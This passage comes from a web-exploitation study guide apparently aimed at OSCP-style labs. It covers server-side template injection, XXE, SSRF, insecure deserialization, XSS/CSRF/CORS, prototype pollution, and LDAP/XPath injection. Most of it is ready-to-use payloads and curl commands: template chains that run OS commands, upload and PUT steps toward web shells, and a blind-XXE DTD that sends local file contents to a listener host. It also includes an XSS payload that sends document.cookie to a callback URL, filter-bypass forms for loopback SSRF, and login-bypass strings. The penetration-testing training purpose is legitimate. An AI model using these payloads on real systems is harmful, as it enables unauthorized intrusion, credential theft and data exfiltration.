if the upload origin is static, chain it to §2.8 LFI/include; do not claim that GIF/EXIF content
executes by itself.

### Handler-configuration files — low probability

**Precondition:** the upload keeps the chosen filename in the effective directory and the server
honors per-directory configuration.

```bash
# Apache only: requires a permitted AllowOverride/FileInfo directive and matching PHP handler
printf 'AddType application/x-httpd-php .probe\n' > /tmp/.htaccess

# PHP CGI/FastCGI only: user_ini.filename enabled; directive and same-directory path must apply
printf 'auto_prepend_file=upload-probe.jpg\n' > /tmp/.user.ini
```

**Success:** a controlled `.probe`/PHP request evaluates only after the configuration file is
accepted and its cache/scan interval has elapsed. **Next:** reproduce with a harmless marker and
remove only your own test files when the lab permits. Do not assume either directive is supported.

Choose payload type from the confirmed handler: PHP (`.php`, sometimes `.phtml`), ASP.NET
(`.aspx`), JSP/servlet containers (`.jsp`/`.war`), or another demonstrated mapping. An accepted
extension, spoofed MIME, or image magic does not matter if the storage origin never executes it.

If `OPTIONS` advertises `PUT`, test with an inert file, retrieve it, and determine whether that
location executes the relevant handler. If uploads are static-only, look for a separate LFI/include,
archive extraction, parser, or overwrite chain rather than cycling through extensions indefinitely.

```bash
curl -sk -X PUT --data-binary @/tmp/upload-probe.txt <url>/<unique-name>.txt
curl -sk <url>/<unique-name>.txt

# Only after inert PUT + handler mapping are proven
curl -sk -X PUT --data-binary @/tmp/upload-probe.php <url>/<unique-name>.php
curl -sk <url>/<unique-name>.php
```

Once a harmless execution marker works, replace it with the smallest web shell or reverse shell
from [§03](03-shells-and-payloads.md).

**Success:** retrieval returns the unique execution marker from a server-side handler, not merely
the uploaded source bytes. **Next:** record the exact multipart/PUT request, stored path/name, and
handler; then deliver the smallest appropriate shell from §03.

## 2.10 Server-side template injection (SSTI)

Use unique arithmetic/string controls to distinguish reflection from evaluation:

```text
{{7*7}}       → common Jinja2/Twig-style probe
${7*7}        → common expression-language probe
<%= 7*7 %>    → ERB/EJS-style probe
#{7*7}        → Pug-style probe
```

`{{7*'7'}}` can help distinguish Python-like repetition (`7777777`) from engines that return `49`
or an error, but no single probe fingerprints every engine. Identify the framework from headers,
errors, source, dependencies, and additional non-destructive expressions.

After engine identification, use a payload matched to the exact engine/version and available
objects. Hard-coded Python `__subclasses__()` indexes and assumed Node globals are runtime-dependent
and should not be kept as universal one-liners. Confirm a harmless command before delivering a
shell; sandboxing may limit the result to information disclosure.

### Jinja2 / Flask

**Precondition:** Jinja2 is confirmed and the named default/Flask object is in context; sandbox and
attribute policy permit the chain.

```jinja2
{{ cycler.__init__.__globals__.os.popen('id').read() }}
{{ get_flashed_messages.__globals__.__builtins__.open('/etc/hostname').read() }}
```

**Success:** command output or the exact file content is rendered. **Next:** use the same available
object for one harmless `id`, then deliver through §03. Do not restore a hard-coded
`__subclasses__()[157]`: subclass order changes by runtime/import set.

### FreeMarker

**Precondition:** FreeMarker is confirmed and the `?new` class resolver allows
`freemarker.template.utility.Execute`.

```freemarker
<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}
```

**Success:** command output is rendered. **Next:** confirm OS/tools, then use §03; if `?new` is
blocked, enumerate developer-supplied objects instead of changing random syntax.

### Smarty / ERB

**Precondition:** exact engine confirmed; the relevant PHP function or Ruby IO/File APIs are
available and not blocked by template security policy.

```smarty
{system('id')}
```

```erb
<%= File.open('/etc/hostname').read %>
<%= IO.popen('id').read %>
```

**Success:** exact file/command output. **Next:** retain the shortest working primitive and move
shell delivery to §03.

### Pug/Jade — version/context dependent

**Precondition:** server-side Pug/Jade exposes `root.process`, runs classic CommonJS, and
`process.mainModule.require` exists. Modern/ESM runtimes often break this original note payload.

```pug
#{root.process.mainModule.require('child_process').execSync('id').toString()}
```

**Success:** `id` output is rendered. **Next:** if `root`/`mainModule` is absent, enumerate the
actual in-scope objects; do not assume the payload is portable.

### Twig / Velocity — historical or supplied-object branches

**Precondition (Twig):** exact Twig 1.x, an unsandboxed environment, `_self.env` exposed, and the
legacy callback/filter methods callable. Twig 2+ changed `_self`; do not treat this as portable.

```twig
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
```

```velocity
#* Requires an exposed ClassTool named $class; use timing if output is unavailable *#
$class.inspect("java.lang.Runtime").type.getRuntime().exec("sleep 5").waitFor()
```

**Success:** exact command output or a repeatable time delta. **Next:** confirm the exact
engine/version/object documentation before retaining a custom chain. These are historical,
version-specific branches—not universal Twig or Velocity payloads.

## 2.11 XXE

High-signal inputs are raw XML, SOAP, SVG, XML-based document import, SAML, and endpoints that
change behavior when `Content-Type` is switched to XML.

```xml
<?xml version="1.0"?>
<!DOCTYPE r [<!ENTITY xxe SYSTEM "file:///etc/hostname">]>
<r>&xxe;</r>
```

Use a known file/missing-file control. For SSRF, replace the entity URL with a scoped localhost or
internal HTTP endpoint. The XML parser must allow DTDs/external entities and the application must
expand the entity in a reachable location.

### PHP-backed XML parser: encode difficult file content

**Precondition:** the XML parser resolves PHP stream wrappers and reflects the expanded entity.

```xml
<?xml version="1.0"?>
<!DOCTYPE r [
  <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/hostname">
]>
<r>&xxe;</r>
```

**Success:** the response contains decodable base64. **Next:** decode locally and use the primitive
for source/config files; this wrapper is PHP-specific.

### XInclude when you control XML data but not `DOCTYPE`

**Precondition:** the value is inserted into an XML document parsed with XInclude enabled.

```xml
<r xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include parse="text" href="file:///etc/hostname"/>
</r>
```

**Success:** the included file appears in parsed output. **Next:** move to source/config or a scoped
internal URL only if the implementation accepts it.

### SVG/document upload XXE

**Precondition:** an uploaded SVG/XML-based document is parsed server-side and its rendered or
extracted text can be retrieved.

```xml
<?xml version="1.0" standalone="yes"?>
<!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/hostname">]>
<svg xmlns="http://www.w3.org/2000/svg" width="500" height="40">
  <text x="10" y="20">&xxe;</text>
</svg>
```

**Success:** local file content appears in the processed image/document. **Next:** use the least
sensitive useful config/source read; if only a callback occurs, switch to the OOB card.

For blind XXE, host a DTD on your lab listener:

```xml
<!-- Request -->
<!DOCTYPE r [
  <!ENTITY % remote SYSTEM "http://<lhost>:8000/evil.dtd">
  %remote;
]>
<r/>
```

```xml
<!-- evil.dtd -->
<!ENTITY % file SYSTEM "file:///etc/hostname">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://<lhost>:8000/?d=%file;'>">
%eval;
%exfil;
```

OOB success requires external parameter entities and outbound connectivity; file contents with
characters invalid in a URL can break exfiltration. PHP stream wrappers are PHP-specific, not a
universal XML capability.

**Success:** in-band file content, a unique controlled callback, or repeatable internal-resource
difference. **Next:** extract only the file/config needed for foothold or pivot to the matching SSRF
card; preserve parser, content type, entity type, and encoding.

## 2.12 SSRF

Confirm the server, not the browser, made the request. Use a unique token at an HTTP listener you
control and compare a reachable/unreachable URL.

```text
?url=http://<lhost>:8000/ssrf-<unique-token>
?url=http://127.0.0.1:<port>/
?url=http://localhost:<port>/
```

Send the exact working request and encode only the URL value:

```bash
curl -skG --data-urlencode \
  '<param>=http://<lhost>:8000/ssrf-<unique-token>' <url>
curl -skG --data-urlencode \
  '<param>=http://127.0.0.1:<evidence-backed-port>/' <url>
```

### Host-filter/parser variants

**Precondition:** server-side fetching is proven but a host allow/block rule rejects literal
loopback. Each form is parser- and language-dependent.

```text
http://127.1:<port>/
http://2130706433:<port>/       # 127.0.0.1 as decimal IPv4
http://0x7f000001:<port>/       # hexadecimal form where accepted
http://0177.0.0.1:<port>/       # octal component where accepted
http://[::1]:<port>/
http://<allowed-host>@127.0.0.1:<port>/
http://127.0.0.1:<port>/#@<allowed-host>
```

**Success:** a blocked literal and one alternate form reach the same known internal service.
**Next:** record the parser discrepancy and test only evidence-backed in-scope endpoints.

### Redirect validation gap

**Precondition:** the application allows your controlled URL and follows redirects without
revalidating the destination.

```bash
# One-shot controlled redirect response; run in a separate terminal
printf 'HTTP/1.1 302 Found\r\nLocation: http://127.0.0.1:<port>/\r\nConnection: close\r\n\r\n' \
  | nc -lvnp 8000

curl -skG --data-urlencode \
  '<param>=http://<lhost>:8000/redirect' <url>
```

**Success:** the target follows the redirect and returns a known internal marker/differential.
**Next:** access the narrow internal admin/API route suggested by source or enumeration.

### Alternate schemes

**Precondition:** the fetch library explicitly supports the scheme and the destination remains in
scope.

```text
file:///etc/hostname
gopher://127.0.0.1:<port>/_<percent-encoded-protocol-request>
```

**Success:** exact file bytes or the expected response/side effect from a known local protocol.
**Next:** prefer read/auth capabilities; construct a gopher request only from a manually verified
protocol exchange, not from a generic destructive template.

Then prioritize scoped local/admin/API services that are known or strongly suggested by source,
errors, or port mappings. If filters block literal loopback, test alternative representations such
as `127.1`, decimal IP, or `[::1]`, and a controlled redirect from an allowed URL. Userinfo (`@`),
fragment (`#`), encoding, and URL-parser discrepancies matter only when they change the server's
validated-versus-requested destination.

Try non-HTTP schemes only if the fetch library supports them and the target service/path is within
scope. Cloud metadata is not the default OSCP standalone hypothesis without cloud evidence.

**Success:** unique callback, internal banner/content, consistent status/size/timing differential,
or a scoped file read. **Next:** turn the reached service into `AUTHENTICATE`, `READ`, or `EXECUTE`
using its dedicated §01/§02 block; do not broaden into blind internal scanning.

## 2.13 Insecure deserialization

Look for structured opaque blobs in cookies, parameters, files, or message bodies: PHP serialized
objects, Java serialization/base64, Python pickle, .NET formats, Ruby Marshal, or signed framework
state.

### Fingerprint and decode without executing

```text
PHP serialize     a:... / O:... / s:...
Java serialization base64 often starts rO0AB
Python pickle     base64 protocol-4 blobs often start gAS
.NET ViewState    commonly starts /wEP
Ruby Marshal      base64 commonly starts BAh
```

```bash
printf '%s' '<base64-blob>' | base64 -d > /tmp/blob.bin
file /tmp/blob.bin
xxd -l 64 /tmp/blob.bin
strings -a /tmp/blob.bin | head -100
```

**Success:** format/runtime/class names or readable properties are identified. **Next:** inspect
application dependencies/source for signature verification and a matching class/gadget.

### Unsigned property manipulation

**Precondition:** the client controls an unsigned PHP-serialized value and the application trusts
the named property. String lengths must match exactly.

```text
a:1:{s:4:"role";s:4:"user";}
a:1:{s:4:"role";s:5:"admin";}
```

**Success:** one controlled property changes server-side behavior. **Next:** use the resulting
authorized feature; do not jump to a gadget chain when an access-control primitive is sufficient.

Before using a gadget chain, prove:

- the value reaches the corresponding deserializer;
- the target has the required class/library and a reachable magic method/gadget/sink;
- integrity signatures or encryption are absent, weak, or use a recovered key;
- the payload format and runtime version match.

Serialization normally transfers data and class references, not the methods of a class created on
your machine. A locally invented class is not an exploit unless a compatible target-side class and
dangerous behavior already exist. Prefer a harmless property/type change or error-based proof, then
use a source-reviewed gadget appropriate to the confirmed dependency set.

**Success:** repeatable property change, type/class-specific error, file read, or harmless command
proof from a dependency-matched gadget. **Next:** preserve the exact format, encoding, signing/key,
class path, library version, and gadget prerequisites; never treat a generic generated blob as
portable.

## 2.14 Browser-mediated and secondary paths

### XSS context probes

**Precondition:** attacker-controlled text is rendered in an HTML/attribute/script context. Match
the payload to that context and start with a harmless visible proof.

```html
<script>alert(document.domain)</script>
<img src=x onerror=alert(document.domain)>
<svg onload=alert(document.domain)>
"><img src=x onerror=alert(document.domain)>
```

```javascript
';alert(document.domain);//
```

**Stored/admin-bot callback — conditional:** the privileged viewer must render the value and the
page must be allowed to reach a security-context-compatible controlled callback (normally HTTPS
from an HTTPS page). Start with a non-sensitive marker; only test a cookie afterward when it is
useful and not `HttpOnly`.

```html
<script>fetch('<https-callback-url>/?m='+encodeURIComponent('xss-'+location.origin),{mode:'no-cors'})</script>
<script>fetch('<https-callback-url>/?c='+encodeURIComponent(document.cookie),{mode:'no-cors'})</script>
```

**Success:** JavaScript executes in the target origin, not merely appears as text. **Next:** only
prioritize a foothold chain when an admin bot/reviewer or privileged victim action exists. `HttpOnly`
blocks reading that cookie but does not necessarily block authenticated same-origin requests.

### CSRF controlled-account proof

**Precondition:** a state-changing action uses ambient cookies, accepts a predictable cross-site
request, and has no effective token/Origin/SameSite defense.

```html
<form action="<url>/change-email" method="POST">
  <input type="hidden" name="email" value="<controlled-email>">
</form>
<script>document.forms[0].submit()</script>
```

**Success:** only the controlled logged-in account changes after loading the PoC from another
origin. **Next:** combine with a credible privileged viewer only when the lab explicitly supplies
one; otherwise record it as secondary impact.

### CORS credentialed-origin check

**Precondition:** a sensitive endpoint uses cookies or browser credentials and reflects/allows
untrusted origins.

```bash
# Header-only candidate: manually adding Cookie does not model browser cookie policy
curl -sk -i <url>/api/account \
  -H 'Origin: https://<controlled-origin>' \
  -H 'Cookie: <controlled-session>'
```

Serve this PoC from the controlled origin; third-party-cookie and `SameSite` policy still apply:

```html
<pre id="out">pending</pre>
<script>
fetch('<url>/api/account', {credentials: 'include'})
  .then(r => r.text())
  .then(t => document.getElementById('out').textContent = t)
  .catch(e => document.getElementById('out').textContent = String(e));
</script>
```

**Success:** the controlled cross-origin page, in a real browser, reads the sensitive response
using only the controlled account. The curl response headers are a candidate, not confirmation.
**Next:** retain the smallest browser PoC and record cookie/SameSite/browser prerequisites.

### Server-side prototype pollution

**Precondition:** attacker-controlled nested input reaches an unsafe recursive merge and a useful
server-side property lookup occurs afterward.

```json
{"__proto__":{"isAdmin":true}}
{"constructor":{"prototype":{"isAdmin":true}}}
```

```text
__proto__[isAdmin]=true
constructor[prototype][isAdmin]=true
```

**Success:** a fresh object/authorization/template behavior gains the property; echoing the JSON is
not enough. **Next:** use the proven authorization/template/command sink, or defer if no sink exists.

IDOR/BOLA and mass-assignment payloads are in §2.3. Keep all browser-mediated paths time-boxed
unless the application provides an admin bot, review queue, or another credible interaction path.

## 2.15 LDAP and XPath injection

### LDAP filter injection

**Precondition:** application input is concatenated unescaped into an LDAP *search filter*. This is
different from a proper credentialed LDAP bind.

```text
# Low-cost wildcard pair for a filter shaped like:
# (&(uid=<username>)(userPassword=<password>))
username=*
password=*

# Parenthesis/operator breakout seen in the same vulnerable filter shape
username=*)(|(&
password=pwd)
```

```bash
curl -sk -X POST <url>/login \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data 'username=*&password=*'

# Negative control: LDAP \2a represents a literal asterisk, not the wildcard operator
curl -sk -X POST <url>/login \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data-urlencode 'username=\2a' --data-urlencode 'password=\2a'
```

LDAP filter metacharacters must normally be escaped: `* → \2a`, `( → \28`, `) → \29`,
`\ → \5c`, and NUL `→ \00`. The complex breakout is shape-dependent; keep the resulting
parentheses balanced instead of treating it as a universal login string.

**Success:** wildcard/true and escaped/false controls return different directory/auth results.
**Next:** use the resulting application access or enumerate only the attributes the application
already exposes; if the app performs a bind, return to credential testing instead.

### XPath injection

**Precondition:** input is concatenated into an XPath predicate used for XML-backed login/search.
The following is a matched detection pair for a shape such as
`//user[username='<INPUT>' and password='<invalid>']`, not a universal login bypass.

```text
username=' or 1=1 or 'a'='b
username=' or 1=2 or 'a'='b
```

```bash
curl -sk -X POST <url>/login \
  --data-urlencode "username=' or 1=1 or 'a'='b" \
  --data-urlencode 'password=<unique-invalid>'
curl -sk -X POST <url>/login \
  --data-urlencode "username=' or 1=2 or 'a'='b" \
  --data-urlencode 'password=<unique-invalid>'
```

**Success:** the true/false pair changes authentication or selected nodes reproducibly. **Next:**
use the authenticated surface or extract one node/character at a time; preserve quote and predicate
context.

## 2.16 Before you move on

- [ ] Every origin and auth state has a request/input map covering query, path, form, JSON/XML,
  multipart, cookies, and relevant headers.
- [ ] Each candidate behavior has a repeatable matched control; one error/delay/status is not the
  sole evidence.
- [ ] Auth/reset/registration/access control, exposed source/config, exact components, SQL/NoSQL,
  command, traversal/LFI, upload, and LDAP/XPath injection were tested where the surface supports
  them.
- [ ] SSRF, XXE, SSTI, and deserialization were tested when an application feature made the parser
  or sink plausible.
- [ ] File-write, database-command, upload-execution, LFI-to-RCE, and gadget prerequisites were
  explicitly confirmed rather than assumed.
- [ ] XSS/CSRF/CORS/prototype-pollution paths were tested only when their rendering, victim,
  credential, merge, and downstream-sink prerequisites made them relevant.
- [ ] A proven read/write/reach/auth capability was converted to the shortest access path, or its
  missing prerequisite and revisit trigger are recorded.
- [ ] Any RCE is reproducible and converted to a stable shell via [§03](03-shells-and-payloads.md).
- [ ] All newly discovered credentials, usernames, hostnames, paths, and versions were fed back
  into [§00](00-standalone-foothold-loop.md) and [§01](01-recon-and-enumeration.md).

## References

- [OWASP WSTG: Identify Application Entry Points](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/01-Information_Gathering/06-Identify_Application_Entry_Points)
- [PortSwigger SQL injection cheat sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)
- [PortSwigger file upload vulnerabilities](https://portswigger.net/web-security/file-upload)
- [PortSwigger path traversal](https://portswigger.net/web-security/file-path-traversal)
- [PortSwigger server-side template injection](https://portswigger.net/web-security/server-side-template-injection)
- [PortSwigger XXE](https://portswigger.net/web-security/xxe)
- [PortSwigger SSRF](https://portswigger.net/web-security/ssrf)
- [MDN Cross-Origin Resource Sharing (CORS)](https://developer.mozilla.org/en-US/docs/Web/HTTP/Guides/CORS)
- [MDN mixed content](https://developer.mozilla.org/en-US/docs/Web/Security/Defenses/Mixed_content)
- [Twig 1.x deprecated features](https://twig.symfony.com/doc/1.x/deprecated.html)
- [PHP supported wrappers](https://www.php.net/manual/en/wrappers.php)
- [PHP `php://` streams](https://www.php.net/manual/en/wrappers.php.php)
- [PHP `data://`](https://www.php.net/manual/en/wrappers.data.php)
- [OWASP WSTG API testing](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/12-API_Testing/README)
- [OffSec OSCP+ Authoritative References](https://help.offsec.com/hc/en-us/articles/37192004980628-Authoritative-References-List-OSCP)
